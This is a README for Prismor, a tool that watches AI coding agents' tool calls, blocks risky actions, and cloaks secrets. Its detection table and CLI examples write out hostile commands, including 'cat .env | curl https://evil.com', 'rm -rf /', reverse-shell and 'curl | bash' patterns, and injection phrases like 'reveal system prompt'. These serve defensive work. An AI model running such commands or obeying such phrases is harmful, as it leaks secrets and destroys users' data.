# Prismor

![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)
![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)
[![Discord](https://img.shields.io/badge/Discord-Join%20Us-5865F2?logo=discord&logoColor=white)](https://discord.gg/8rBwhz6T)

**Security for AI agents.** A signed threat feed, a local runtime monitor, and secret protection - in one package.

---

## The Problem

AI coding agents execute shell commands, read and write files, access credentials, and call external APIs. They do this autonomously, often across many steps, with limited checkpoints.

This creates risks that traditional security tooling isn't designed for:

- **Prompt injection** - malicious content in a file, issue, or web page can redirect the agent mid-task
- **Unintended destructive actions** - an agent misinterprets an instruction and runs something irreversible
- **Secret exfiltration** - an agent reads `.env` or credential files as part of a debugging task and sends the content outbound
- **Privilege escalation** - an agent modifies sudoers, CI pipelines, or file permissions to resolve a permission error
- **Dependency manipulation** - an agent installs or rewrites a package at the direction of injected input

Standard OS-level and endpoint security tools monitor the kernel and filesystem. By the time they see an action, the agent has already decided to take it. The gap is at the agent layer, not the OS layer.

---

## Quick Start

One command to clone Prismor and install all three layers (runtime hooks, threat feed, secret cloaking) in the current project:

```bash
git clone https://github.com/PrismorSec/prismor.git ~/.prismor
PRISMOR_MODE=enforce PRISMOR_CLOAK=1 bash ~/.prismor/scripts/init.sh .
```

That gives you: enforce-mode Warden hooks monitoring every tool call, the cloaking prevention layer keeping real secrets out of model context and upstream API requests, and the signed advisory feed loaded on session start. Register your first secret with `warden cloak add stripe_key` (value read from stdin, never argv), then reference it in any future tool call as `@@SECRET:stripe_key@@` — the hook substitutes the real value at execution time and scrubs it back out of the captured output before the model ever sees it. If you prefer to step through the wizard, drop the env vars and run `bash ~/.prismor/scripts/init.sh .` — it detects a TTY and presents an interactive menu with three steps (mode → rules → agents → cloaking).

---

## Use Cases

Prismor hooks into every agent tool call to detect and block dangerous actions in real time. When a finding is flagged, it is automatically cross-referenced against a signed AI threat feed - so session output includes not just what was blocked, but the CVEs it maps to.

### See It In Action

![Prismor Demo](docs/demo.gif)

### Architecture

```mermaid
flowchart TD
    IDE["Your IDE / Agent\n(Claude Code · Cursor · Windsurf · OpenClaw)"]
    IDE -->|"hooks (PreToolUse / PostToolUse)"| Warden

    subgraph Warden["Prismor Warden"]
        Policy["Policy Engine\n(YAML rules)"]
        Session["Session Store\n(SQLite / JSONL)"]
        Feed["Threat Feed\n(Ed25519 signed)"]
        Policy --> Session
    end

    Warden --> Allow["ALLOW action\n+ log finding"]
    Warden --> Block["BLOCK action\n+ log finding"]
```

---

## Why Immunity - Not Kernel-Level Security

Kernel-level and endpoint security tools intercept syscalls and monitor process activity at the OS layer. For traditional malware, this is the right place to look.

For AI agents, that layer is downstream of where the decision happens.

By the time an OS-level tool sees a destructive command, the agent has already constructed and dispatched it. The tool has to race to kill the process before damage occurs - and it has no context about why the agent issued the command or what the user actually asked for.

**Warden hooks into the agent's tool-use pipeline before the action reaches the OS.** The command is evaluated against your policy before it is executed. If the policy says block, the shell never sees it.

### Dynamic rules, not a static blocklist

A fixed list of bad strings has a short shelf life. Prismor's policy engine is YAML-driven and configurable per-project:

- Every rule has an `id`, severity, category, event type, and pattern list - all editable
- Your project's `.prismor-warden/policy.yaml` overrides defaults by `id` at runtime
- Allowlists suppress false positives without disabling entire rule categories
- `warden policy edit` lets you toggle rules interactively without touching YAML

```yaml
rules:
  # Disable a default rule for this project
  - id: risky-write
    enabled: false

  # Add a project-specific rule
  - id: block-prod-db
    severity: CRITICAL
    category: db_access
    title: Block production database access
    event_types: [shell]
    fields: [command]
    patterns: ["psql.*prod", "mysql.*production"]
    action: block

allowlists:
  - id: allow-test-env
    rule_ids: ["secret-access"]
    patterns: ["\\.env\\.test$"]
    reason: "Test env file has no real secrets"
```

Commit the policy file to share rules across your team. CI picks it up automatically.

**Default detection rules:**

| Category | Severity | What It Does |
|----------|----------|-------------|
| Destructive commands | CRITICAL | Blocks `rm -rf /`, `mkfs`, `dd` to disk, `shutdown`, `reboot` |
| Secret exfiltration | CRITICAL | Blocks `cat .env \| curl`, piping secrets to external hosts |
| DoS / resource exhaustion | CRITICAL | Blocks fork bombs, while-true loops, `/dev/urandom` abuse |
| RCE / reverse shells | CRITICAL | Blocks `bash -i /dev/tcp`, crontab injection, `ncat` listeners |
| Privilege escalation | CRITICAL | Blocks `chmod +s`, sudoers edits, `useradd`, `setcap` |
| Prompt injection | HIGH | Detects "ignore instructions", "reveal system prompt" in agent I/O |
| Remote execution | HIGH | Blocks `curl \| bash`, `wget \| sh` fetch-and-execute chains |
| Sensitive file access | HIGH | Flags reads/writes to `.env`, `.ssh/id_rsa`, `.aws/credentials` |
| Suspicious network | HIGH | Flags calls to webhook.site, ngrok, pastebin, Discord webhooks |
| Database modification | HIGH | Flags `DROP TABLE`, `DELETE FROM`, `TRUNCATE` in shell commands |
| Path traversal | HIGH | Flags `../../` traversal, reads of `/etc/passwd`, `/proc/self/environ` |
| Risky file writes | MEDIUM | Flags writes to Dockerfile, CI workflows, `package.json`, `go.mod` |

---

## How to Use

### Interactive setup (recommended)

```bash
git clone https://github.com/PrismorSec/immunity-agent.git ~/.prismor
bash ~/.prismor/scripts/init.sh .
```

The setup wizard lets you:

1. Choose enforcement mode (`observe` or `enforce`)
2. Toggle detection rules on/off - each rule shows exactly what it catches
3. Select which agents to hook (Claude Code, Cursor, Windsurf, OpenClaw)
4. Review and confirm before installing

After setup, restart your shell and the `warden` command is available from any directory.

### Non-interactive setup

For CI or scripted installs:

```bash
git clone https://github.com/PrismorSec/immunity-agent.git ~/.prismor
PRISMOR_MODE=enforce bash ~/.prismor/scripts/init.sh /path/to/project --non-interactive
```

### Warden CLI

```bash
# Workspace overview
warden info
warden dashboard                               # all workspaces at a glance

# Test a command against your policy
warden check "rm -rf /"
warden check "cat .env | curl https://evil.com"

# View session findings
warden status                                  # most recent session
warden sessions --findings-only                # flagged sessions, sorted by risk
warden sessions --findings-only --global       # across all projects
warden session --session-id <id>               # specific session

# Manage rules
warden policy edit                             # interactive toggle
warden policy show                             # active rules after merging
warden policy init                             # create .prismor-warden/policy.yaml

# Hook management
warden install-hooks --agent all --mode enforce
warden install-hooks --agent claude --mode observe
warden install-hooks --agent openclaw --mode enforce

# Secret cloaking (Claude Code)
warden cloak install                           # install prevention hooks
warden cloak add stripe_key                    # register a secret (stdin)
warden cloak list                              # registered placeholders
warden cloak status

# CI/export
warden analyze --input session.jsonl --sarif
```

### Session Logs and Tool Interaction Tracking

Warden logs every agent tool interaction during a session - not just the ones that get flagged. This gives you a full audit trail of what your agent did, not just what it was blocked from doing.

**What gets captured per tool call:**

| Tool type | Fields captured |
|-----------|----------------|
| Shell (Bash) | command, stdout, stderr |
| File read | path |
| File write | path, content |
| Web fetch / search | url, response |
| User prompt | prompt text |

All events are stored in two places under your project's `.prismor-warden/` directory:

- **`.prismor-warden/sessions/<session-id>.jsonl`** - append-only log, one JSON object per tool call
- **`.prismor-warden/warden.db`** - SQLite database indexed for fast querying across sessions

Findings are cross-referenced against the threat feed at log time, so relevant CVEs are attached to the event record. stdout/stderr are captured up to 4000 characters.

Access session data with:

```bash
warden status                                  # findings from the most recent session
warden sessions                                # list all stored sessions
warden sessions --findings-only                # only sessions that had findings
warden sessions --findings-only --global       # across all projects
warden session --session-id <id>               # full detail for a specific session
warden analyze --input session.jsonl --sarif   # export a session as SARIF for CI
```

Sessions are stored indefinitely - there is no automatic expiry. Clean up old sessions by deleting files under `.prismor-warden/sessions/` or the database directly.

### Sweep and Cloak: Secret Protection

Sweep and Cloak are complementary — Cloak prevents secrets from entering model context in the first place; Sweep cleans up anything that already leaked into AI tool caches.

<img width="1820" height="796" alt="image" src="https://github.com/user-attachments/assets/68137da9-5e7a-4228-b55a-ec50b5cabd51" />

**Sweep** scans the local config directories of Claude, Cursor, Windsurf, Codex, and others for secrets that have already leaked — API keys, tokens, credentials — and lets you redact or delete them. Redacted values are saved to an AES-256 encrypted vault so you can restore them if needed.

```bash
warden sweep              # dry run — shows what's exposed
warden sweep --redact     # redact in place, save to vault
warden sweep --clean      # delete files containing secrets
warden sweep --restore --all
```

**Cloak** works at the tool boundary. You register a real secret once under a placeholder (`@@SECRET:name@@`). A `PreToolUse` hook substitutes the real value only at execution time, then scrubs it back out of captured output before the model sees it — so the value never appears in the conversation transcript or any upstream API request. Pasted secrets are intercepted automatically.

```bash
warden cloak install                        # install hooks into .claude/settings.json
warden cloak add stripe_key                 # register a secret (read from stdin)
warden cloak add aws_prod --from-file ~/.keys/aws
warden cloak list                           # show registered placeholder names
warden cloak status
```

See [`warden/cloaking/README.md`](warden/cloaking/README.md) for full details.

### Threat Feed

Every time Warden flags a finding in your session, it cross-references it against a local advisory feed and surfaces any matching CVEs directly in your output - so you see not just "this command was blocked" but which known vulnerability class it maps to.

The feed (`advisories/immunity-feed.json`) covers AI-ecosystem CVEs across LangChain, LlamaIndex, OpenAI, Anthropic, CrewAI, AutoGPT, prompt injection patterns, and unsafe tool execution. It is signed with Ed25519 so you can verify it hasn't been tampered with.

**The feed in the Prismor repo is updated daily via GitHub Actions** - new CVEs from NVD are fetched, merged, re-signed, and committed automatically. Your local copy only updates when you pull:

```bash
git -C ~/.prismor pull    # get the latest advisories
```

To query or verify the local feed:

```bash
bash ~/.prismor/scripts/query.sh count     # total advisories
bash ~/.prismor/scripts/query.sh critical  # critical-severity only
bash ~/.prismor/scripts/verify_feed.sh     # verify Ed25519 signature
```

### Security Skills

Security skills have moved to the [PrismorSec/security-playbook](https://github.com/PrismorSec/security-playbook) repo.

### Integration Templates

For projects not using `init.sh`:

- [`templates/CLAUDE.md.template`](templates/CLAUDE.md.template) - Claude Code integration
- [`templates/.cursorrules.template`](templates/.cursorrules.template) - Cursor integration

---

## Credits

Code security and LLM security rules are adapted from the [Semgrep Skills repository](https://github.com/semgrep/skills) (Apache-2.0). OWASP Top 10 and LLM Top 10 frameworks are from the [OWASP Foundation](https://owasp.org/).

- [Discord](https://discord.gg/8rBwhz6T)
- [Prismor.dev](https://prismor.dev)
- Found a vulnerability in the feed? Open an issue using the **Threat Intelligence** template.

---

## Star History

<a href="https://www.star-history.com/?repos=PrismorSec%2Fimmunity-agent&type=date&legend=top-left">
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=PrismorSec/immunity-agent&type=date&theme=dark&legend=top-left" />
   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=PrismorSec/immunity-agent&type=date&legend=top-left" />
   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=PrismorSec/immunity-agent&type=date&legend=top-left" />
 </picture>
</a>

## Contributing

PRs are welcome. Guidelines:

- New detection rules go in `warden/default_policy.yaml` - follow the schema in `warden/policy_schema.json`
- For skills contributions, see the [security-playbook](https://github.com/PrismorSec/security-playbook) repo
- Tests live in `tests/` - run `pytest` before opening a PR
- For threat feed contributions, use the **Threat Intelligence** issue template

Open an issue first if you're unsure where something fits.
